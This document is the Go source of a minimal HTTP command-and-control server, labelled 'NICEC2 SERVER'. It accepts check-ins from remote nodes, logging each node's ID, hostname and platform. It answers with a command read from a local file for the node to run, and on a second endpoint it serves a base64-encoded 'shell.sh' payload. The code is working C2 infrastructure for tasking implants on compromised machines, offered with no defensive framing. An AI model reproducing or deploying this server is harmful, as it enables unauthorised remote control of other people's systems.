package main

import (
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

const banner string = `

███╗   ██╗██╗ ██████╗███████╗ ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
████╗  ██║██║██╔════╝██╔════╝██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██╔██╗ ██║██║██║     █████╗  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║╚██╗██║██║██║     ██╔══╝  ██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██║ ╚████║██║╚██████╗███████╗╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                                                  

`

type Command struct {
	NodeID  string `json:"NodeID"`
	Action  string `json:"Action"`
	Content string `json:"Command"`
}

type node_check_in struct {
	ID       string
	Hostname string
	Platform string
}

func nodeCheckIn(w http.ResponseWriter, req *http.Request) {

	// Get's the current time
	dt := time.Now()

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node node_check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	// Output something pretty
	fmt.Println()
	fmt.Println("============= New Check in =============")

	fmt.Println("ID: " + node.ID)
	fmt.Println("Hostname: " + node.Hostname)
	fmt.Println("Platform: " + node.Platform)
	fmt.Println("Time: " + dt.String())

	fmt.Println("============= ----------- =============")

	//JSON reponse

	// Get a new command
	Command := refresh_commands()

	var response = []byte(`
	{
		"ID": "` + node.ID + `", 
		"command": "run", 
		"details": "` + Command + `"
	}`)

	// Send the response back
	fmt.Fprintf(w, string(response))

}

func nodeSendFile(w http.ResponseWriter, req *http.Request) {

	// Decode the json body
	decoder := json.NewDecoder(req.Body)
	var node node_check_in
	err := decoder.Decode(&node)
	if err != nil {
		panic(err)
	}

	script := read_script("payloads/shell.sh")

	var response = []byte(`
	{
		"ID": "` + node.ID + `",
		"command": "File",
		"details": "` + script + `"
	}`)

	// Sending the reponse
	fmt.Fprintf(w, string(response))

}

func handleRequests() {

	myRouter := mux.NewRouter().StrictSlash(true)

	// myRouter.HandleFunc("/test", shrug).Methods("GET")
	myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")

	myRouter.HandleFunc("/payload", nodeSendFile).Methods("POST")

	log.Fatal(http.ListenAndServe(":8081", myRouter))
}

func main() {

	fmt.Println(banner)

	handleRequests()

}

func refresh_commands() string {

	//Reading the command file, this will be JSON at some point I reckon

	bFile, _ := ioutil.ReadFile("command.txt")
	command := string(bFile)
	command = strings.Replace(command, "\n", "", -1)

	return command
}

func read_script(path string) string {

	// Read the file
	bFile, _ := ioutil.ReadFile(path)
	script := string(bFile)
	// script = strings.Replace(script, "\n", "", -1)

	// fmt.Println(script)

	// here is where we turn the file into some nice data I think
	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))

	return encoded_script

}
